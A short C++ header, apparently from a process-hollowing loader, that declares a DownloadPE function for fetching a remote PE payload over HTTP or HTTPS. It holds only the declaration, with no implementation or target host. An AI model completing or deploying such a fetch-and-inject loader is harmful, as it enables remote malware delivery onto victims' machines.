#pragma once
#include "Common.h"
#include <wininet.h>

namespace Hollowing {
    /**
     * @brief 网络模块类
     * 负责通过 HTTP/HTTPS 协议下载远程 PE Payload
     */
    class Network {
    public:
        /**
         * @brief 从 URL 下载二进制数据
         * @param url 目标链接 (支持 http:// 和 https://)
         * @param outData [out] 存储下载数据的 vector
         * @return 下载成功返回 true
         */
        static bool DownloadPE(const std::string& url, std::vector<BYTE>& outData);
    };
}
